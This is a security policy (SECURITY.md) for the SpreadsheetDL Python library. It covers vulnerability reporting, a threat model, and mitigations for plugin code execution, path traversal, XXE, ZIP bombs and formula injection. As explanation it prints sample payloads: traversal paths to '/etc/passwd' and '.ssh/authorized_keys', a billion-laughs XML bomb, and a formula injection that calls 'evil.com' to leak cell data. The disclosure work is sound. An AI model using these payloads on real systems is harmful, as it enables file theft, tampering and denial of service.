# Security Policy

## Supported Versions

We release patches for security vulnerabilities for the following versions:

| Version | Supported          |
| ------- | ------------------ |
| 4.0.x   | :white_check_mark: |
| < 4.0   | :x:                |

## Reporting a Vulnerability

**We take security seriously.** If you discover a security vulnerability within SpreadsheetDL, please report it responsibly.

### How to Report

**Preferred Method:** Open a [private security advisory](https://github.com/lair-click-bats/spreadsheet-dl/security/advisories/new) on GitHub.

**Alternative:** If you cannot use GitHub security advisories, please create an issue with the label "security" and we will respond promptly.

**Please do not report security vulnerabilities through public GitHub issues unless they are already publicly disclosed.**

### What to Include

When reporting a vulnerability, please include:

- **Type of vulnerability** (e.g., path traversal, XML bomb, arbitrary code execution, credential exposure)
- **Full paths of source file(s)** related to the vulnerability
- **Location of affected source code** (tag/branch/commit or direct URL)
- **Step-by-step instructions** to reproduce the issue
- **Proof-of-concept or exploit code** (if possible)
- **Impact assessment**, including how an attacker might exploit it
- **Suggested fix** (if you have one)

### Response Timeline

- **Initial response**: Within 48 hours
- **Severity assessment**: Within 7 days
- **Security patch release**: Within 30 days for critical vulnerabilities
- **Public disclosure**: After patch is released and users have time to upgrade

---

## Threat Model

### Trusted Components

- Python runtime environment (CPython 3.12+)
- System libraries (libc, OpenSSL if using `cryptography`)
- Official domain plugins (9 domains: finance, data_science, biology, manufacturing, etc.)
- Dependencies from PyPI (see Dependency Security section)

### Untrusted Components

- **User-provided spreadsheet files** (may contain malicious formulas, XML bombs, ZIP bombs)
- **User-provided file paths** (path traversal risk)
- **Third-party plugins** from `~/.spreadsheet-dl/plugins/` or `./plugins/` (arbitrary code execution)
- **External data sources**: CSV imports, Plaid API, HTML scraping, WebDAV servers
- **MCP client requests** (all tool inputs are untrusted)
- **Formula cell references** (injection risk)

### Attack Vectors

SpreadsheetDL has the following attack surface:

1. **Malicious spreadsheet files**: Formula injection, XML entity expansion (XXE), ZIP bombs
2. **Path traversal**: File operations with unsanitized user-provided paths
3. **Arbitrary code execution**: Malicious plugins loaded from plugin directories
4. **Denial of Service**: Large files (100k+ rows), circular formula references, XML/ZIP bombs
5. **Credential theft**: Exposure of Plaid API keys, Nextcloud passwords, master passwords
6. **Server-Side Request Forgery (SSRF)**: WebDAV and Plaid API integrations
7. **Formula injection**: Malicious cell references in formula builder
8. **MCP tool abuse**: Unauthorized file access, resource exhaustion via MCP server

---

## Critical Security Vulnerabilities

### 1. Plugin System - Arbitrary Code Execution

**Severity: CRITICAL**

SpreadsheetDL loads Python files from plugin directories without signature verification or sandboxing.

**Affected Code:**

- `src/spreadsheet_dl/plugins.py:217-223` (PluginLoader.discover_plugins)
- Plugin directories: `~/.spreadsheet-dl/plugins/`, `./plugins/`

**Risk:**

- Malicious plugins have **full system access**
- No permission model, no sandboxing, no integrity checks
- Attacker can place `.py` file in plugin directory → arbitrary code execution

**Mitigation:**

```python
# DO NOT use third-party plugins unless you have audited their source code
# Only use official plugins from src/spreadsheet_dl/domains/

# To disable plugin auto-discovery:
from spreadsheet_dl.plugins import PluginManager
manager = PluginManager(plugin_dirs=[])  # Empty list = no plugins
```

**Planned Fixes:**

- Plugin signature verification (v4.1.0)
- Plugin permission model (v4.2.0)
- Sandboxing via subprocess isolation (v5.0.0)

### 2. Path Traversal - Unauthorized File Access

**Severity: CRITICAL**

All file I/O operations accept user-provided paths without validation.

**Affected Code:**

- 341 file operations across 65 files
- `streaming.py`, `adapters.py`, `security.py`, `export.py`, `_mcp/tools/*.py`

**Risk:**

- Read arbitrary files: `../../etc/passwd`
- Write to arbitrary locations: `../../.ssh/authorized_keys`
- Symlink attacks
- Overwrite system files with elevated privileges

**Vulnerable Example:**

```python
# UNSAFE - no path validation
from spreadsheet_dl import OdsGenerator
generator = OdsGenerator()
generator.create_budget_spreadsheet("../../../../tmp/evil.ods")  # Path traversal!
```

**Mitigation:**

```python
from pathlib import Path

def safe_path(base_dir: Path, user_path: str) -> Path:
    """Ensure user path is within base directory."""
    base_dir = base_dir.resolve()
    full_path = (base_dir / user_path).resolve()

    # Check if path is within base directory
    if not full_path.is_relative_to(base_dir):
        raise ValueError(f"Path traversal detected: {user_path}")

    # Check for symlink attacks
    if full_path.is_symlink():
        raise ValueError(f"Symlink not allowed: {user_path}")

    return full_path

# Usage
base = Path("/var/data/spreadsheets")
safe = safe_path(base, user_input)  # Validates path
```

**Best Practice:**

- **Never** pass unsanitized user input to file operations
- Always use absolute base directories with validation
- Run with minimal filesystem permissions (chroot, Docker volumes)

### 3. XML Entity Expansion (XXE) / Billion Laughs Attack

**Severity: HIGH**

ODS files are zipped XML. The XML parser has no entity expansion protection.

**Affected Code:**

- `src/spreadsheet_dl/streaming.py:8` (`xml.etree.ElementTree`)
- All ODS read operations

**Risk:**

- **Billion Laughs Attack**: Exponential entity expansion → memory exhaustion → crash
- **XXE (External Entity Injection)**: Read local files, SSRF to internal services

**Vulnerable XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- Repeat 10 times = 10^10 expansions = 3GB+ memory -->
]>
<office:document>
  <text:p>&lol3;</text:p>
</office:document>
```

**Mitigation:**

- **DO NOT** open ODS files from untrusted sources
- Use `defusedxml` library (install separately):
  ```bash
  pip install defusedxml
  ```

**Planned Fix:**

- Replace `xml.etree.ElementTree` with `defusedxml.ElementTree` (v4.0.1)

### 4. ZIP Bomb - Denial of Service

**Severity: HIGH**

ODS files are ZIP archives. No file size limits before extraction.

**Affected Code:**

- `src/spreadsheet_dl/streaming.py:9` (`zipfile`)

**Risk:**

- 1KB compressed file → 10GB decompressed → out of memory crash
- Nested ZIP files (recursive decompression)

**Mitigation:**

```python
import zipfile
from pathlib import Path

MAX_UNCOMPRESSED_SIZE = 100 * 1024 * 1024  # 100MB
MAX_COMPRESSION_RATIO = 100  # 100:1

def safe_extract_zip(zip_path: Path, extract_to: Path) -> None:
    """Safely extract ZIP with size limits."""
    with zipfile.ZipFile(zip_path) as zf:
        total_size = 0
        for info in zf.infolist():
            total_size += info.file_size

            # Check total uncompressed size
            if total_size > MAX_UNCOMPRESSED_SIZE:
                raise ValueError(f"ZIP file too large: {total_size} bytes")

            # Check compression ratio (ZIP bomb detection)
            if info.compress_size > 0:
                ratio = info.file_size / info.compress_size
                if ratio > MAX_COMPRESSION_RATIO:
                    raise ValueError(f"Suspicious compression ratio: {ratio}")

        zf.extractall(extract_to)
```

**Planned Fix:**

- Add ZIP bomb detection to StreamingReader (v4.0.1)

### 5. Formula Injection

**Severity: MEDIUM**

User input in cell references is directly injected into formulas without sanitization.

**Affected Code:**

- `src/spreadsheet_dl/_builder/formulas.py:60-98`

**Risk:**

- Inject malicious formulas via cell references
- Escape formula syntax to inject arbitrary ODF expressions

**Vulnerable Example:**

```python
from spreadsheet_dl import formula

f = formula()
user_input = 'A1];WEBSERVICE("http://evil.com?leak="&A1);[.B1'
malicious = f.sum(user_input)  # Injects WEBSERVICE call!
# Result: of:=SUM([.A1];WEBSERVICE("http://evil.com?leak="&A1);[.B1])
```

**Mitigation:**

```python
import re

def sanitize_cell_ref(ref: str) -> str:
    """Validate cell reference format."""
    # Only allow: A1, $A$1, A1:B10, Sheet.A1
    pattern = r'^(\$?[A-Z]+\$?\d+|\$?[A-Z]+:\$?[A-Z]+|[A-Za-z0-9_]+\.\$?[A-Z]+\$?\d+)$'
    if not re.match(pattern, ref):
        raise ValueError(f"Invalid cell reference: {ref}")
    return ref

# Use before passing to formula builder
safe_ref = sanitize_cell_ref(user_input)
f.sum(safe_ref)
```

**Best Practice:**

- **Never** pass unsanitized user input to formula builder
- Validate cell references with strict regex
- Use named ranges instead of dynamic cell references

### 6. Credential Storage - Weak Master Passwords

**Severity: MEDIUM**

Credential store allows weak master passwords, enabling brute force attacks.

**Affected Code:**

- `src/spreadsheet_dl/security.py:710-732` (CredentialStore)

**Risk:**

- User chooses weak password (e.g., "password123")
- Attacker brute forces `~/.config/spreadsheet-dl/credentials.enc`
- Gains access to Plaid API keys, Nextcloud passwords

**Mitigation:**

```python
from spreadsheet_dl.security import check_password_strength, generate_password

# Enforce strong passwords
strength = check_password_strength(user_password)
if strength['level'] not in ['strong', 'good']:
    raise ValueError(f"Password too weak. {', '.join(strength['feedback'])}")

# Or generate strong password
strong_pw = generate_password(length=24, include_symbols=True)
print(f"Use this password: {strong_pw}")
```

**Best Practice:**

- Use password managers (1Password, Bitwarden) for master passwords
- Minimum 16 characters with mixed case, numbers, symbols
- Enable OS-level credential storage (Keychain, gnome-keyring) instead

### 7. MCP Server - No Resource Limits

**Severity: MEDIUM**

MCP server has no rate limiting, request size limits, or timeout enforcement.

**Affected Code:**

- `src/spreadsheet_dl/_mcp/server.py`
- 18 exposed tools

**Risk:**

- Infinite loop via recursive tool calls
- Memory exhaustion by creating large spreadsheets
- Disk exhaustion by exporting many files
- CPU exhaustion by complex formula recalculation

**Mitigation:**

```bash
# Run MCP server with resource limits (Linux)
ulimit -v 1048576    # 1GB virtual memory
ulimit -t 300        # 5 minutes CPU time
ulimit -f 10485760   # 10GB file size
spreadsheet-dl-mcp

# Or use Docker with limits
docker run --memory=1g --cpus=1 --read-only spreadsheet-dl-mcp
```

**Best Practice:**

- **NEVER** expose MCP server over network (no authentication!)
- Use only via stdio with trusted local clients (Claude Desktop)
- Run in isolated container with resource limits
- Monitor resource usage

### 8. Encryption Implementation - Not Audited

**Severity: MEDIUM**

Pure Python AES-256-GCM simulation using XOR + HMAC has not been audited.

**Affected Code:**

- `src/spreadsheet_dl/security.py:265-354`

**Risk:**

- Timing attacks on HMAC comparison
- Weak randomness in nonce generation
- Implementation bugs in CTR mode simulation

**Vulnerable Code:**

```python
# Pure Python fallback (NOT production-grade)
def _xor_encrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    """XOR-based stream cipher (CTR mode simulation)."""
    # Uses SHA-256 for keystream - not hardware-accelerated
    # May be vulnerable to side-channel attacks
```

**Mitigation:**

```bash
# ALWAYS use cryptography library for production
pip install cryptography

# Verify it's being used
python -c "import cryptography; print('OK')"
```

**Best Practice:**

- **DO NOT** rely on pure Python crypto for production
- Install `cryptography` library (hardware-accelerated, audited)
- Use full-disk encryption (LUKS, BitLocker, FileVault) as primary defense
- Pure Python fallback is for **development/testing only**

---

## Dependency Security

SpreadsheetDL depends on multiple third-party libraries. Vulnerabilities in dependencies affect SpreadsheetDL.

### Critical Dependencies

| Dependency       | Security Risk                     | Mitigation                    |
| ---------------- | --------------------------------- | ----------------------------- |
| `odfpy`          | XML parsing vulnerabilities       | Keep updated, use defusedxml  |
| `pandas`         | Data processing bugs              | Keep updated                  |
| `pyexcel-ods3`   | ODS parsing vulnerabilities       | Keep updated                  |
| `requests`       | SSRF, TLS vulnerabilities         | Keep updated, validate URLs   |
| `beautifulsoup4` | HTML parsing, XSS                 | Keep updated, sanitize output |
| `lxml`           | XML vulnerabilities (XXE)         | Keep updated, use defusedxml  |
| `plaid-python`   | API security, credential handling | Keep updated, use env vars    |

### Vulnerability Scanning

```bash
# Install security scanner
pip install safety pip-audit

# Check for known vulnerabilities
safety check --json
pip-audit --format json

# Keep dependencies updated
pip install --upgrade spreadsheet-dl
```

### Automated Scanning

Add to CI/CD pipeline:

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan dependencies
        run: |
          pip install safety
          safety check --json
```

---

## Security Best Practices

### Pre-Deployment Checklist

Before using SpreadsheetDL in production:

- [ ] **Install cryptography library**: `pip install cryptography`
- [ ] **Validate all user-provided file paths** (see Path Traversal section)
- [ ] **DO NOT load third-party plugins** (arbitrary code execution risk)
- [ ] **Set resource limits** (ulimit, Docker memory/CPU constraints)
- [ ] **Enable audit logging**: `SecurityAuditLog()` for all file operations
- [ ] **Use environment variables** for credentials (never hardcode)
- [ ] **Restrict MCP server** to trusted clients only (never network-exposed)
- [ ] **Keep dependencies updated**: Run `safety check` weekly
- [ ] **Use minimal filesystem permissions** (principle of least privilege)
- [ ] **Enable full-disk encryption** (primary defense for data at rest)
- [ ] **Validate spreadsheet files** from untrusted sources before opening
- [ ] **Use defusedxml** for XML parsing: `pip install defusedxml`

### Input Validation

**ALWAYS validate user input before file operations:**

```python
from pathlib import Path
import re

def validate_inputs(file_path: str, cell_ref: str) -> tuple[Path, str]:
    """Validate all user inputs."""
    # Path validation
    base_dir = Path("/var/data/spreadsheets").resolve()
    full_path = (base_dir / file_path).resolve()
    if not full_path.is_relative_to(base_dir):
        raise ValueError("Path traversal detected")

    # Cell reference validation
    if not re.match(r'^[A-Z]+\d+$', cell_ref):
        raise ValueError("Invalid cell reference")

    return full_path, cell_ref
```

### Credential Management

```bash
# Use environment variables (not hardcoded)
export NEXTCLOUD_URL=https://nextcloud.example.com
export NEXTCLOUD_USER=username
export NEXTCLOUD_PASSWORD=$(pass show nextcloud/app-password)
export PLAID_CLIENT_ID=$(pass show plaid/client-id)
export PLAID_SECRET=$(pass show plaid/secret)

# Or use OS credential storage
# macOS: security add-generic-password -s "spreadsheet-dl" -a "nextcloud" -w
# Linux: secret-tool store --label='SpreadsheetDL Nextcloud' service nextcloud
```

### Secure Deployment

**Docker Example:**

```dockerfile
FROM python:3.12-slim
RUN pip install spreadsheet-dl cryptography defusedxml
USER nobody
WORKDIR /data
VOLUME /data
CMD ["spreadsheet-dl-mcp"]
```

**Run with limits:**

```bash
docker run \
  --read-only \
  --memory=1g \
  --cpus=1 \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  -v /safe/data:/data:ro \
  spreadsheet-dl
```

---

## Out of Scope

The following are **NOT** considered security vulnerabilities:

### 1. Malicious Formulas Executed by Spreadsheet Applications

**Not a vulnerability:** Formulas like `=WEBSERVICE()`, `=DDE()`, `=IMPORTXML()` executed by LibreOffice/Excel when user opens the file.

**Reason:** SpreadsheetDL writes formulas to files but does not evaluate them. The spreadsheet application (LibreOffice Calc, Microsoft Excel) is responsible for formula evaluation.

**User responsibility:** Do not open spreadsheet files from untrusted sources in LibreOffice/Excel.

### 2. Denial of Service via Extremely Large Files

**Not a vulnerability:** Out-of-memory crash when processing 1GB+ spreadsheet files.

**Reason:** Designed for files up to 100MB. Larger files require streaming mode or resource limits.

**Mitigation:** Use `StreamingReader` for large files, set ulimit/Docker memory constraints.

### 3. Plugin Vulnerabilities in Third-Party Plugins

**Not a vulnerability:** Security issues in community plugins or user-created plugins.

**Reason:** Plugin system is designed for extensibility. Users must vet third-party plugins.

**Mitigation:** Only use official plugins from `src/spreadsheet_dl/domains/`.

### 4. Vulnerabilities in Upstream Dependencies

**Not a dependency vulnerability:** Security issues in `pandas`, `odfpy`, `requests`, etc.

**Reason:** Should be reported to upstream projects, not SpreadsheetDL.

**Action:** We will update dependencies promptly when upstream patches are released.

### 5. Social Engineering

**Not a vulnerability:** Tricking users into installing malicious plugins or opening malicious files.

**Reason:** User education, not a code vulnerability.

### 6. Physical Access Attacks

**Not a vulnerability:** Attacker with physical access to machine reads `~/.config/spreadsheet-dl/credentials.enc`.

**Reason:** Physical access defeats most security controls. Use full-disk encryption.

---

## Disclosure Policy

### Coordinated Disclosure

- **Report received**: Acknowledge within 48 hours
- **Severity assessment**: Within 7 days, assign CVSS score
- **Patch development**: Within 30 days for critical (CVSS 9.0+), 90 days for high (CVSS 7.0-8.9)
- **Security advisory**: Published with patch release
- **Public disclosure**: 7 days after patch release (allows time to upgrade)
- **CVE assignment**: Requested for all CVSS 7.0+ vulnerabilities

### Credit

We believe in recognizing security researchers:

- **Hall of Fame**: Listed in SECURITY.md (with permission)
- **CVE credit**: Named in CVE database entry
- **Release notes**: Acknowledged in CHANGELOG.md

### Bug Bounty

We do not currently offer a bug bounty program. All security research is volunteer-based.

---

## Security Advisories

Published security advisories are available at:
https://github.com/lair-click-bats/spreadsheet-dl/security/advisories

### Past Advisories

None yet (first public release: v4.0.0)

---

## Contact

**Primary:** [Open a private security advisory](https://github.com/lair-click-bats/spreadsheet-dl/security/advisories/new)

**Secondary:** Create a GitHub issue with the "security" label (for non-sensitive issues)

**DO NOT:** Report vulnerabilities in public issues, pull requests, or discussions

---

## Acknowledgments

Thank you to all security researchers who help keep SpreadsheetDL and its users secure!

### Security Researchers

(None yet - be the first!)

---

**Last Updated:** 2026-01-06
**Version:** 4.0.0
